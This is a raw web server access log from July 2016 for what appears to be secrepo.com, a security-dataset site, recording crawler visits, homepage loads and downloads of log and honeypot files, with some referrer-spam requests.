149.202.74.134 - - [15/Jul/2016:07:19:33 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
157.55.39.133 - - [15/Jul/2016:07:24:20 -0700] "GET /self.logs/access.log.2015-09-04.gz HTTP/1.1" 200 7123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
111.7.128.40 - - [15/Jul/2016:07:25:16 -0700] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
123.125.71.22 - - [15/Jul/2016:07:32:55 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
139.194.196.12 - - [15/Jul/2016:07:34:23 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 677440 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:27 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 6325462 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:26 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 6695560 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:25 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 6895580 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:29 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 5350900 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:27 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 6331821 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:27 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 5178620 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:12 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 1511277 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:27 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 4683680 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:34:26 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 6257560 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:28 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 443439 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:13 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 1137340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:29 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 382605 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:11 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 1512560 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:32 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 253266 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:34 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 103068 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:34 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 119672 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:07:35:28 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 206 446760 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
197.211.34.35 - - [15/Jul/2016:07:40:22 -0700] "GET / HTTP/1.1" 200 9904 "https://www.google.com.ng/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
197.211.34.35 - - [15/Jul/2016:07:40:23 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
197.211.34.35 - - [15/Jul/2016:07:40:23 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
197.211.34.35 - - [15/Jul/2016:07:40:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:41:51 -0700] "GET / HTTP/1.1" 200 9904 "https://www.google.co.id/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:41:51 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:41:52 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:41:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:43:31 -0700] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:42:40 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 14442320 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
149.202.74.134 - - [15/Jul/2016:07:45:08 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
114.124.4.185 - - [15/Jul/2016:07:45:22 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274093 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.6.2704.63 Safari/537.36" 
149.202.74.134 - - [15/Jul/2016:07:45:48 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
149.202.74.134 - - [15/Jul/2016:07:46:38 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36" 
103.47.133.74 - - [15/Jul/2016:07:55:28 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:07:55:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:07:55:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 206 634 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:07:55:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:07:55:29 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:07:55:31 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
123.125.67.206 - - [15/Jul/2016:07:59:45 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
112.215.45.5 - - [15/Jul/2016:08:02:50 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-us; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/42.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1" 
112.215.45.5 - - [15/Jul/2016:08:02:53 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-us; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/42.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1" 
112.215.45.5 - - [15/Jul/2016:08:02:53 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-us; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/42.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1" 
112.215.45.5 - - [15/Jul/2016:08:02:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-us; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/42.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1" 
68.180.228.157 - - [15/Jul/2016:08:13:00 -0700] "GET /self.logs/error.log.2015-04-03.gz HTTP/1.1" 200 876 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
111.13.102.138 - - [15/Jul/2016:08:26:35 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.94 - - [15/Jul/2016:08:26:35 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
51.255.65.71 - - [15/Jul/2016:08:30:43 -0700] "GET /self.logs/error.log.2015-10-26.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
103.47.133.74 - - [15/Jul/2016:08:32:43 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 614860 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:08:32:45 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 692960 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:47 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 252590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:08:32:44 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 654620 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:47 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 274877 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:48 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 112904 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:45 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 625311 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.133.74 - - [15/Jul/2016:08:32:47 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 428840 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:47 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 162484 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:51 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 46860 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:47 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 207320 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
103.47.135.26 - - [15/Jul/2016:08:32:52 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 206 46860 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" 
164.132.161.89 - - [15/Jul/2016:08:35:31 -0700] "GET /self.logs/error.log.2016-02-03.gz HTTP/1.1" 200 710 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
68.180.228.157 - - [15/Jul/2016:08:48:51 -0700] "GET /self.logs/error.log.2015-10-06.gz HTTP/1.1" 200 504 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
123.125.71.74 - - [15/Jul/2016:08:51:28 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
46.118.238.138 - - [15/Jul/2016:08:52:03 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://www.regionshop.biz/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT) ::ELNSB50::000061100320025802a00111000000000507000900000000" 
46.118.238.138 - - [15/Jul/2016:08:52:03 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://www.regionshop.biz/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT) ::ELNSB50::000061100320025802a00111000000000507000900000000" 
46.118.238.138 - - [15/Jul/2016:08:52:04 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://www.regionshop.biz/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT) ::ELNSB50::000061100320025802a00111000000000507000900000000" 
70.39.157.192 - - [15/Jul/2016:08:53:11 -0700] "GET / HTTP/1.1" 200 33084 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" 
66.249.64.189 - - [15/Jul/2016:09:02:56 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
123.125.71.112 - - [15/Jul/2016:09:19:18 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
51.255.65.73 - - [15/Jul/2016:09:31:05 -0700] "GET /self.logs/access.log.2015-09-17.gz HTTP/1.1" 200 6093 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
117.190.191.170 - - [15/Jul/2016:09:38:11 -0700] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
151.80.31.169 - - [15/Jul/2016:09:42:26 -0700] "GET /self.logs/access.log.2015-05-11.gz HTTP/1.1" 200 5110 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
164.132.161.32 - - [15/Jul/2016:09:43:22 -0700] "GET /self.logs/error.log.2015-05-19.gz HTTP/1.1" 200 943 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
46.119.112.87 - - [15/Jul/2016:09:46:10 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://bryansk.xrus.org/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
46.119.112.87 - - [15/Jul/2016:09:46:11 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://bryansk.xrus.org/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
46.119.112.87 - - [15/Jul/2016:09:46:12 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://bryansk.xrus.org/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
123.125.68.22 - - [15/Jul/2016:09:51:20 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.121 - - [15/Jul/2016:09:51:20 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
85.222.36.115 - - [15/Jul/2016:10:02:33 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930836 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
151.226.198.162 - - [15/Jul/2016:10:04:08 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
178.137.163.41 - - [15/Jul/2016:10:07:32 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://tver.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
178.137.163.41 - - [15/Jul/2016:10:07:33 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://tver.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
123.125.71.112 - - [15/Jul/2016:10:16:14 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
183.19.21.208 - - [15/Jul/2016:10:15:46 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 558720 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2220.0 Safari/537.36" 
111.7.128.40 - - [15/Jul/2016:10:25:19 -0700] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.9 - - [15/Jul/2016:10:29:15 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.9 - - [15/Jul/2016:10:29:15 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.125.71.89 - - [15/Jul/2016:10:30:47 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
89.165.86.209 - - [15/Jul/2016:10:35:00 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
89.165.86.209 - - [15/Jul/2016:10:35:01 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
89.165.86.209 - - [15/Jul/2016:10:35:01 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
89.165.86.209 - - [15/Jul/2016:10:35:02 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:35:39 -0700] "GET / HTTP/1.1" 200 9904 "http://www.mlsecproject.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:35:39 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:35:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:35:40 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:36:07 -0700] "GET /self.logs/ HTTP/1.1" 200 11325 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:36:14 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:36:16 -0700] "GET /self.logs/access.log.2015-01-17.gz HTTP/1.1" 200 3597 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:37:11 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 23177322 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
5.255.250.93 - - [15/Jul/2016:10:42:04 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
199.106.103.57 - - [15/Jul/2016:10:43:27 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.57 - - [15/Jul/2016:10:43:27 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.57 - - [15/Jul/2016:10:43:28 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.57 - - [15/Jul/2016:10:43:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.57 - - [15/Jul/2016:10:46:34 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
